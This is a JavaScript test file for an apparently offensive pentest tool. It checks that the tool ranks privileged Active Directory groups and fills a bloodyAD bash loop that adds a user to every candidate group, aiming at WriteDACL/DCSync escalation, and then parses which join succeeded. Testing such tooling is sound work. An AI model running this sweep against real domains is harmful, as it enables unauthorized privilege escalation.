/* ACL-abuse group sweep: obol must NOT hard-code which group is the winner. From a bloodyAD get-writable
 * lead it ranks the reasonable groups (try-order, not the answer) and builds a ONE-SHOT command that adds
 * to every candidate at once; whichever add the OUTPUT confirms is recorded as ad.group_joined. */
'use strict';
var fs = require('fs'), path = require('path'), vm = require('vm');
var ENGINE = path.join(__dirname, '..', '..', 'assets', 'engine');
var ctx = { console: { log: function () {}, warn: function () {} } }; ctx.globalThis = ctx; vm.createContext(ctx);
function load(f) { vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f }); }
['facts.js', 'phases.js', 'command.js'].forEach(function (f) { try { load(path.join(ENGINE, f)); } catch (e) {} });
load(path.join(ENGINE, 'parsers', 'common.js'));
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource'].forEach(function (m) { load(path.join(ENGINE, 'parsers', m + '.js')); });
load(path.join(ENGINE, 'parsers', 'index.js'));
var OBOL = ctx.OBOL;

var fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// ---- token fill: rank candidates, don't hard-code the winner ----
// A lead whose targets were ENUMERATED with DnsAdmins before Exchange Windows Permissions. The old code
// filled {{group}} with the first-listed (DnsAdmins) — a dead end. The winner must rank ahead of it.
var lead = { targets: ['Key Admins', 'DnsAdmins', 'Exchange Windows Permissions', 'Account Operators', 'EXCH01'] };
var facts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'ad.acl_lead', scope: 'domain:corp.local', value: lead })]);
var ctxTok = OBOL.command.buildContext(facts, { params: { domain: 'corp.local', target: '10.0.0.5', user: 'svc', password: 'pw' } });
ok(String(ctxTok.group).toLowerCase() === 'exchange windows permissions', '{{group}} ranks Exchange Windows Permissions (WriteDACL→DCSync) ahead of the first-enumerated DnsAdmins');
ok(/"Exchange Windows Permissions"/.test(ctxTok.abuse_groups_quoted) && /"DnsAdmins"/.test(ctxTok.abuse_groups_quoted) && /"Account Operators"/.test(ctxTok.abuse_groups_quoted), '{{abuse_groups_quoted}} lists EVERY reasonable candidate, quoted');
ok(ctxTok.abuse_groups_quoted.indexOf('"EXCH01"') === -1, 'a computer account (EXCH01) is not offered as a group to join');
// priority order preserved in the sweep list (EWP before DnsAdmins)
ok(ctxTok.abuse_groups_quoted.indexOf('Exchange Windows Permissions') < ctxTok.abuse_groups_quoted.indexOf('DnsAdmins'), 'the sweep tries higher-value groups first');

// the sweep template actually fills into a runnable one-shot loop
var sweepTmpl = 'for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p \'{{password}}\' add groupMember "$g" {{user}} 2>/dev/null && echo "[+] JOINED: $g"; done';
var sweep = OBOL.command.fillTemplate(sweepTmpl, facts, { params: { domain: 'corp.local', target: '10.0.0.5', user: 'svc', password: 'pw' } });
ok(sweep.indexOf('{{') === -1, 'the sweep command fills with no leftover tokens');
ok(/for g in "Exchange Windows Permissions"/.test(sweep), 'the sweep iterates the quoted candidate list');

// no lead yet → the sweep still forms over the usual suspects rather than an empty loop
var empty = OBOL.command.buildContext(new OBOL.facts.FactSet([]), { params: { domain: 'corp.local' } });
ok(/"Exchange Windows Permissions"/i.test(empty.abuse_groups_quoted) && /"Backup Operators"/i.test(empty.abuse_groups_quoted), 'with no lead, {{abuse_groups_quoted}} falls back to the standard high-value groups');

// ---- evidence-driven join parsing: keep the wins, ignore the denials ----
function joinedGroups(command, stdout) {
  var r = OBOL.parsers.parseActionOutput({ actionId: '', command: command, stdout: stdout, source: 'paste', scope: 'host:10.0.0.5', domain: 'corp.local' });
  return (r.facts || []).filter(function (f) { return f.kind === 'ad.group_joined'; }).map(function (f) { return String((f.value || {}).group).toLowerCase(); });
}
// single add: the group comes from the OUTPUT, not the command
ok(joinedGroups('bloodyAD -d corp.local --host 10.0.0.5 -u svc -p \'pw\' add groupMember "DnsAdmins" svc', '[+] svc added to DnsAdmins').indexOf('dnsadmins') >= 0, 'a single add records the joined group from its success line');
// the sweep: successes AND failures interleaved — keep the wins, the denials suppress nothing
var sweepOut = [
  'for g in "Domain Admins" "Exchange Windows Permissions" "DnsAdmins"; do ...',
  'add groupMember: insufficientAccessRights for Domain Admins - Access is denied',
  '[+] svc added to Exchange Windows Permissions',
  '[+] JOINED: Exchange Windows Permissions',
  'add groupMember: insufficientAccessRights for DnsAdmins - Access is denied',
].join('\n');
var jg = joinedGroups('for g in "Domain Admins" "Exchange Windows Permissions" "DnsAdmins"; do bloodyAD ... add groupMember "$g" svc; done', sweepOut);
ok(jg.indexOf('exchange windows permissions') >= 0, 'the sweep records the group that stuck (Exchange Windows Permissions)');
ok(jg.indexOf('domain admins') === -1 && jg.indexOf('dnsadmins') === -1, 'denied groups in the sweep produce NO join fact (evidence-bound)');
ok(jg.filter(function (g) { return g === 'exchange windows permissions'; }).length === 1, 'the joined group is recorded once (dedup across the two success lines)');

// a get-writable label that ALSO carries an abuse verb (paste recovery) still parses the join
ok(joinedGroups("bloodyAD ... get writable --detail  bloodyAD ... add groupMember \"DnsAdmins\" svc", '[+] svc added to DnsAdmins').indexOf('dnsadmins') >= 0, 'an abuse verb is parsed even when the widened label also contains "get writable"');

console.log(fail ? ('\nACL GROUP SWEEP: ' + fail + ' FAILURES') : '\nACL GROUP SWEEP: all passed');
process.exit(fail ? 1 : 0);
